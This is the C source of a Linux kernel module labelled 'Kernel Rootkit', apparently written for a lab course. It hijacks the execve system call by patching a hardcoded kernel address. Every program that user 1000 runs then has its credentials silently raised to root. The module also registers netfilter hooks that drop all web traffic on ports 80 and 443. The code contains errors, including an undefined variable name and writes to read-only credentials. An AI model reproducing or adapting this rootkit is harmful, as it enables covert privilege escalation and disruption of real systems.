#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <linux/mm.h>
#include <linux/highmem.h>
#include <asm/unistd.h>

//For the Netfilter stuff
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/in.h>

#define DRIVER_AUTHOR "Matt"
#define DRIVER_DESC   "Kernel Rootkit"

MODULE_LICENSE("GPL");         
MODULE_AUTHOR(DRIVER_AUTHOR);   
MODULE_DESCRIPTION(DRIVER_DESC);

int init(void);
void cleanup(void);

#define NF_IP_PRE_ROUTING	0
#define NF_IP_LOCAL_IN		1
#define NF_IP_FORWARD		2
#define NF_IP_LOCAL_OUT		3
#define NF_IP_POST_ROUTING	4
#define NF_IP_NUMHOOKS		5



int set_page_rw(long unsigned long _addr)
{
	unsigned int level;
	pte_t *pte = lookup_address(_addr, &level);
	if(pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
	return 0;
}


//execve pointer & task_struct
static int *disp_ptr;
struct task_struct *task;

//Netfilter structs
static struct nf_hook_ops netfilter_ops_in;
static struct nf_hook_ops netfilter_ops_out;

//original execve
asmlinkage long (*original_call) (void *, void *, void *);

//Lab 19 main_hook
unsigned int main_hook(unsigned int hooknum,
		               struct sk_buff *skb,
					   const struct net_device *in,
					   const struct net_device *out,
					   int (*okfn)(struct sk_buff*))
{
	struct sk_buff *socket_buffer = skb;
	struct iphdr *ip;
    struct tcphdr *tcp;
	ip = ip_hdr(socket_buffer);

	if(ip->protocol == IPPROTO_TCP)
	{
		tcp = tcp_hdr(socket_buffer);
		unsigned short int portNum = htons((unsigned short int) tcp->dest);

		if ((portNum == 80) || (tportNum == 443))
		{
			printk(KERN_INFO "BLOCKING WEB TRAFFIC %d\n", portNum);
			return NF_DROP;
		}
		else{ return NF_ACCEPT; }
	}
	else{ return NF_ACCEPT; }
}

int do_root(void) /* I am gRoot */
{
		struct cred *cred = current_cred();

		if(cred->uid.val == 1000)
		{
		 cred->uid.val = 0;
		 cred->euid.val = 0;
		 cred->gid.val = 0;
		 cred->egid.val = 0;
		 override_creds(cred);

		 printk(KERN_INFO "Got that R00T\n");
		}

	return 0;
}

asmlinkage long my_execve(void *arg0, void *arg1, void *arg2)
{
   char buf[128];
   if(strncpy_from_user(buf, (char *) arg0, sizeof(buf)-1) > 0)
   {
	   buf[sizeof(buf) - 1] = '\0';
	   do_root();
   }

   return original_call(arg0,arg1,arg2);
}

int init_module()
{

    disp_ptr = (int *) (0xffffffff816b8f73 +1);
    original_call = (void *)((char *) disp_ptr +4 + *disp_ptr);
    set_page_rw((unsigned long) disp_ptr);
    *disp_ptr = (long)my_execve - ((long)disp_ptr +4);

    //Netfilter stolen from lab 19
    netfilter_ops_in.hook                   =   main_hook;
    netfilter_ops_in.pf                     =   PF_INET;
	netfilter_ops_in.hooknum                =   NF_IP_PRE_ROUTING;
    netfilter_ops_in.priority               =	NF_IP_PRI_FIRST;
    netfilter_ops_out.hook                  =   main_hook;
    netfilter_ops_out.pf                    =   PF_INET;
    netfilter_ops_out.hooknum               =   NF_IP_POST_ROUTING;
    netfilter_ops_out.priority              =   NF_IP_PRI_FIRST;
    nf_register_hook(&netfilter_ops_in);
    nf_register_hook(&netfilter_ops_out);

    return 0;
}

void cleanup_module()
{

   //Reset pointer for execve
   *disp_ptr = (long)original_call - ((long)disp_ptr +4);

   //Unregister netfilter hooks
   nf_unregister_hook(&netfilter_ops_in);
   nf_unregister_hook(&netfilter_ops_out);

}
